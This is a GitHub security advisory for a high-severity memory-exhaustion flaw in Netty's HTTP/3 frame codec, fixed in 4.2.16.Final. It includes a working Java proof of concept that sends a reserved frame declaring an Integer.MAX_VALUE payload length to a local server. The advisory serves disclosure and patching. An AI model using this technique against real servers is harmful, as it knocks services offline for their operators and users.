# [H] Netty: Memory Exhaustion via HTTP/3 Reserved Frame Types

## Summary
Severity: High
Advisory: GHSA-hpcc-26xq-25fv
CVE: CVE-2026-56816
CWE: CWE-400
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-22
Source: https://github.com/advisories/GHSA-hpcc-26xq-25fv
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-http3` — affected >=0 <4.2.16.Final

## Details
### Summary
Netty's Http3FrameCodec buffers incoming data for HTTP/3 reserved frame types up to the specified payload length without any limits. The payload length is read directly from the wire and trusted without validation. A bad actor can send a reserved frame with a payload length of up to Integer.MAX_VALUE, causing the server to buffer the data in memory. This leads to an OOM and a gradual Denial of Service due to memory exhaustion as multiple streams are opened.

### Details
`io.netty.handler.codec.http3.Http3FrameCodec#decodeFrame` handles reserved frame types as follows:

```java
                // Handling reserved frame types
                // https://tools.ietf.org/html/draft-ietf-quic-http-32#section-7.2.8
                if (in.readableBytes() < payLoadLength) {
                    return 0;
                }
```

The `payLoadLength` is read directly from the wire and trusted implicitly. Since `payLoadLength` can be up to Integer.MAX_VALUE and there is no maximum payload length enforcement for reserved frames, the decoder will accumulate bytes in memory until the wire-provided length is reached.

This allows a bad actor to exhaust server memory by opening multiple QUIC streams and sending reserved frames with large payload lengths, followed by a small amount of data (e.g., up to the defined limit) on each stream.

### PoC

```java
    @Test
    public void test() throws Exception {
        EventLoopGroup group = new MultiThreadIoEventLoopGroup(1, NioIoHandler.newFactory());
        try {
            X509Bundle cert = new CertificateBuilder()
                    .subject("cn=localhost")
                    .setIsCertificateAuthority(true)
                    .buildSelfSigned();

            QuicSslContext serverContext = QuicSslContextBuilder.forServer(cert.toTempPrivateKeyPem(), null, cert.toTempCertChainPem())
                    .applicationProtocols(Http3.supportedApplicationProtocols())
                    .build();

            CountDownLatch serverConnectionClosed = new CountDownLatch(1);

            ChannelHandler serverCodec = Http3.newQuicServerCodecBuilder()
                    .sslContext(serverContext)
                    .maxIdleTimeout(5000, TimeUnit.MILLISECONDS)
                    .initialMaxData(10_000_000)
                    .initialMaxStreamDataBidirectionalLocal(1_000_000)
                    .initialMaxStreamDataBidirectionalRemote(1_000_000)
                    .initialMaxStreamsBidirectional(100)
                    .tokenHandler(InsecureQuicTokenHandler.INSTANCE)
                    .handler(new ChannelInitializer<QuicChannel>() {
                        @Override
                        protected void initChannel(QuicChannel ch) {
                            ch.closeFuture().addListener(f -> serverConnectionClosed.countDown());
                            ch.pipeline().addLast(new Http3ServerConnectionHandler(
                                    new ChannelInboundHandlerAdapter() {
                                        @Override
                                        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
                                            cause.printStackTrace();
                                            ctx.close();
                                        }
                                    }));
                        }
                    })
                    .build();

            Channel server = new Bootstrap()
                    .group(group)
                    .channel(NioDatagramChannel.class)
                    .handler(serverCodec)
                    .bind("127.0.0.1", 0)
                    .sync()
                    .channel();

            QuicSslContext clientContext = QuicSslContextBuilder.forClient()
                    .trustManager(InsecureTrustManagerFactory.INSTANCE)
                    .applicationProtocols(Http3.supportedApplicationProtocols())
                    .build();

            ChannelHandler clientCodec = Http3.newQuicClientCodecBuilder()
                    .sslContext(clientContext)
                    .maxIdleTimeout(5000, TimeUnit.MILLISECONDS)
                    .initialMaxData(10_000_000)
                    .initialMaxStreamDataBidirectionalLocal(1_000_000)
                    .build();

            Channel client = new Bootstrap()
                    .group(group)
                    .channel(NioDatagramChannel.class)
                    .handler(clientCodec)
                    .bind(0)
                    .sync()
                    .channel();

            QuicChannel quicChannel = QuicChannel.newBootstrap(client)
                    .handler(new Http3ClientConnectionHandler())
                    .remoteAddress(server.localAddress())
                    .localAddress(client.localAddress())
                    .connect()
                    .get();

            QuicStreamChannel rawStream =
                    quicChannel.createStream(QuicStreamType.BIDIRECTIONAL, new ChannelInboundHandlerAdapter()).get();

            ByteBuf header = Unpooled.buffer();

            // Write reserved frame type (64)
            header.writeByte(0x40);
            header.writeByte(0x40);

            // Write payload length (Integer.MAX_VALUE)
            header.writeByte(0xC0);
            header.writeByte(0x00);
            header.writeByte(0x00);
            header.writeByte(0x00);
            header.writeByte(0x7F);
            header.writeByte(0xFF);
            header.writeByte(0xFF);
            header.writeByte(0xFF);

            rawStream.write(header);

            // Write the maximum allowed payload
            int payloadSize = 1_000_000;
            ByteBuf payload = Unpooled.wrappedBuffer(new byte[payloadSize]);
            rawStream.writeAndFlush(payload).sync();

            assertTrue(quicChannel.isActive());

            quicChannel.closeFuture().await(5, TimeUnit.SECONDS);
            server.close().sync();
            client.close().sync();
        } finally {
            group.shutdownGracefully();
        }
    }
```

### Impact
Denial of Service due to gradual memory exhaustion. Any application using Netty's HTTP/3 codec is impacted.

## References
- https://github.com/netty/netty/security/advisories/GHSA-hpcc-26xq-25fv
- https://nvd.nist.gov/vuln/detail/CVE-2026-56816
- https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b
- https://github.com/netty/netty
- https://github.com/netty/netty/releases/tag/netty-4.2.16.Final
